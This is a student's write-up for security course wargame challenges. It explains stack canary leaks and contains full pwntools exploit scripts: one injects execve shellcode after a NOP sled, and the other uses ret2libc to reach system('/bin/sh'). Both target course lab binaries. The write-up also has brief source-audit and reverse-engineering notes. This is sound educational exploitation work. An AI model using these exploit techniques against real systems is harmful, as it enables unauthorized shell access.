# COMP6447 Wargame 5
Written by WENG XINN CHOW (z5346077) on 10.07.2022

shellcrack
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNS1zaGVsbGNyYWNrIiwiaXAiOiIxMDMuMjE2LjE5MC4zNyIsInNlc3Npb24iOiJmYWM2YWI1YS1hNDBjLTRmZGMtODc5ZC01Mjk0ZmZlMzRiNTIifQ.k4teRFdTzvMI9X68l3Wsx84MV5TN7ij09a5wCE9U6Ms}

General overview of problems faced
-------------------------------------
1. Had to research ```fread()``` vulnerability. From the binary, we knew that it can read up to 16 bytes. 
2. Thus, I entered a 16-byte input with ```\n``` included. There was no  null terminator in the input, therefore, the canary on the stack was leaked (printed by ```printf```) as there was no null terminator. 
3. Then, we need to store the leaked canary and buffer address. 
4. Had to find the offset to the canary (48) by using ```gdb```. 
5. Had to figure out the offset to the return address from the canary address by using ```cyclic```.
6. The last thing to do is to send a payload, that contains a NOPsled + shellcode (48 bytes), the leaked canary, followed by enough bytes to the return address, then the stored buffer address. 

Script/Command used
------------------
```
from pwn import * 

# p = process("./shellcrack")
host = "comp6447.wtf"
port = 17840
p = remote(host, port)

# Makes fread() reads  16 bytes without a null terminator
p.recvline()
payload = b'A' * 15 + b'\n'
p.send(payload)

# Leak and store the canary 
# p.recvuntil(b'\n')[:-1]
# canary = p.recvuntil(b'\n')[:-1]
p.recvline()
canary = p.recvline()
canary = canary[:8]
p.recvuntil(b'[')
buffer_addr = p.recvuntil(b']')[:-1]
print(buffer_addr)
buffer_addr = int(buffer_addr, 0)

# Shell code 
shellcode = asm(
    """
    push 0x0068732f 
    push 0x6e69622f 
    mov ebx, esp
    mov eax, SYS_execve
    xor ecx, ecx 
    xor edx, edx 
    int 0x80 
    """
)

payload = b'\x90' * (48 - len(shellcode))
payload += shellcode
payload += canary 
# Use cyclic to find the offset to the return address
# payload += cyclic(1000)
offset = cyclic_find(0x61616165)
payload += b'A' * offset
payload += p32(buffer_addr)
# gdb.attach(p)

p.sendline(payload)

p.interactive()
```
stack-dump2
===========================
General overview of problems faced
-------------------------------------
1. Had to find canary address. From ```gdb```, use ```canary``` to find the canary and its address. Since the canary and its address is randomised everytime we run the  program, we have to find the offset of the canary address from the given stack pointer, which is 105. 
2. By sending the canary address, the canary is leaked from the dump memory. 
3. Since the stack is non-executable, the previous approach used in stack-dump is not applicable in this case. 
4. I am not sure what I did wrong but I wa s guessing we should use ```ret2libc``` approach.
5. By printing the memory map, I was able to find the start address of ```libc```. 
6. I was able to find the ```/bin/sh``` address in ```libc``` but the main problem is to find the ```libc``` addresses of of ```system()``` and ```exit()```. I tried with  ```gdb``` but apparently the addresses changes in every run. 
7. The final payload should include the offset of buffer to the canary (96),  the canary, followed by the address of system call, the return address of system call, then the address of the command ```/bin/sh```. 

Script/Command used
------------------
```
from pwn import *

p = process("./stack-dump2")

p.recvuntil(b'pointer ')
pointer = p.recvuntil(b'\n')[:-1]
canary_addr = int(pointer, 0) + 105
canary_addr = p32(canary_addr)
canary_addr += b'\n'
# print(canary_addr)

p.recvlines(4)

p.sendline(b'a')
p.sendline(b'5')
p.sendline(canary_addr)

p.recvlines(14)

p.sendline(b'b')
canary = p.recvline()
canary = canary[22:26]

p.recvlines(4)

p.sendline(b'c')
p.recvlines(4)

start_addr = p.recvuntil(b'-')[:-1]
start_addr = int(start_addr, 16)
system_addr = start_addr - 0x152af 
system_addr = p32(system_addr)
binsh_addr = start_addr + 0x1bd0f5
binsh_addr = p32(binsh_addr)

p.sendline(b'a')

# canary_offset = canary_addr -  start of buffer
canary_offset = 96
size  = canary_offset + len(canary) + len(system_addr)  + len(binsh_addr) + 1
p.sendline(str(size).encode('UTF-8'))

payload = b'A' * canary_offset
payload += canary
payload += system_addr
payload += binsh_addr
payload += b'\n'

p.sendline(payload)

p.interactive()
```
src challenge
=================
General overview of problems faced
--------------------------------------
106: Potential buffer overflows when length of the buffer < MAX_LEN.

169: Casting a signed int to an unsigned int, this could be a problem when the value in level is negative. 

re challenge
=============
General overview of problems faced
-------------------------------------
1. Had to study ```sars``` and how it is related to division of power of 2. 
2. Needed to figure the changes to each register to keep track of the operations. 
```C
# include <math.h>

int re_this(int a, int b){
    return (
        (a + b) - (715827883 - ((a + b) * 715827883) / pow(2, 31)) * 3
    );
}
``

